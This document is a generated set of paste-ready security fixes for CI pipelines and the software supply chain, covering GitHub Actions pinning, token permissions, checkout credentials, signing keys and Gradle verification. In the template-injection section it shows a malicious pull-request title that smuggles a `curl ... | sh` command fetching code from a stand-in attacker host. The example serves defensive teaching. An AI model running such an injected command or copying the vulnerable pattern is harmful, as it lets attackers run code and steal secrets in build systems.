# Paste-ready fixes: CI and supply chain

<!-- Generated by scripts/generate.py. Don't edit by hand. -->

These snippets are released under MIT-0: use them in any app, no attribution needed. Adapt names to the project, keep the logic.

## CI-001: Action is pinned to a tag or branch, not a commit SHA

Replace the tag with the full 40-character commit SHA and keep the version in a trailing comment. Let a tool such as `pinact run` write the pin, and let Dependabot (with a cooldown) keep it current. Reference this repository's own actions as `./…` or `$/…`.

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

Verify: Run `pinact run --check` or zizmor's `unpinned-uses` audit: every remote `uses:` in workflows and composite `action.yml` files should end in a 40-character SHA.

Book: [§15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)

## CI-002: Workflow token permissions are not restricted

Add `permissions: {}` at the top of the workflow so the token can do nothing, then grant each job only what it needs. Never use `write-all`.

```yaml
permissions: {}          # workflow level: deny everything
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read     # job level: only what this job needs
```

Verify: Open a run's "Set up job" log and check the GITHUB_TOKEN permissions list matches what the job needs.

Book: [§15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)

## CI-003: pull_request_target workflow checks out the pull request's code

Use `pull_request` for anything that builds or tests contributed code. If you need `pull_request_target`, never check out or run the fork's code in that job, and never let it write a cache or artifact another workflow uses.

```yaml
on:
  pull_request:          # fork code runs with a read-only token and no secrets

permissions: {}
jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - run: ./gradlew assembleDebug
```

Verify: Search the workflow for `pull_request_target` and confirm no job in it checks out `github.event.pull_request.head.*` or runs `gh pr checkout`.

Book: [§15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)

## CI-004: Untrusted event text is pasted into a run script

Pass the value through `env:` and read it as a quoted shell variable, so it stays data.

```yaml
# Wrong: a PR titled   x"; curl -s https://evil.example | sh; echo "   runs as your script
- run: echo "Checking ${{ github.event.pull_request.title }}"

# Right: pass it as data through the environment, and quote it
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $PR_TITLE"
```

Verify: Run zizmor (`template-injection` audit) or actionlint; no `run:` block should expand attacker-controlled fields (titles, bodies, branch names, commit messages, `github.head_ref`) directly.

Book: [§15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)

## CI-005: actions/checkout leaves the job token on disk

Set `persist-credentials: false` on every checkout. Only a job that pushes back to the repository needs the token: set `persist-credentials: true` there on purpose, or pass the token to that one command.

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false   # don't leave the token on disk for later steps
```

Verify: In a test run, add a step `git config --get-regexp 'http.*extraheader'`; it should print nothing. zizmor's `artipacked` audit also flags checkouts that keep credentials.

Book: [§15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)

## CI-006: Signing key or signing password is committed to the repository

Rotate first: request an upload key reset in Play Console, or revoke the certificate or API key. Then remove the file from history, store the keystore base64-encoded in the CI secret store, decode it at build time, and read passwords from environment variables.

```kotlin
// app/build.gradle.kts
val uploadKeystore: String? = System.getenv("UPLOAD_KEYSTORE_PATH")

android {
    signingConfigs {
        create("release") {
            if (uploadKeystore != null) {
                storeFile = file(uploadKeystore)
                storePassword = System.getenv("UPLOAD_KEYSTORE_PASSWORD")
                keyAlias = System.getenv("UPLOAD_KEY_ALIAS")
                keyPassword = System.getenv("UPLOAD_KEY_PASSWORD")
            }
        }
    }
}
```

Verify: Run `git log --all -- '*.jks' '*.keystore' '*.p12' '*.p8' key.properties` and confirm nothing comes back after the history rewrite.

Book: [§15.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#156-signing-keys-and-release-integrity)

## CI-007: Gradle wrapper download is not checked against a SHA-256

Add `distributionSha256Sum` to `gradle/wrapper/gradle-wrapper.properties`, using the checksum published for that exact Gradle version. `./gradlew wrapper --gradle-version <v> --gradle-distribution-sha256-sum <sha>` writes it for you.

```properties
# gradle/wrapper/gradle-wrapper.properties
distributionUrl=https\://services.gradle.org/distributions/gradle-<version>-bin.zip
distributionSha256Sum=<SHA-256 published at gradle.org/release-checksums for that file>
```

Verify: Change one character of the checksum and run `./gradlew help` on a clean machine: the download should fail verification.

Book: [§15.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#154-dependencies-and-build-inputs)

## CI-008: No dependency lockfile is committed

Enable Gradle dependency locking and commit each module's `gradle.lockfile`, or commit `gradle/verification-metadata.xml` with `<verify-metadata>true</verify-metadata>`. For Swift packages, commit `Package.resolved`; libraries others depend on may leave it out on purpose.

```kotlin
// build.gradle.kts (each module, or once in a convention plugin)
dependencyLocking {
    lockAllConfigurations()
}
```

Verify: Run `./gradlew dependencies --write-locks`, commit the result, and confirm a later build fails if a resolved version changes.

Book: [§15.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#154-dependencies-and-build-inputs)
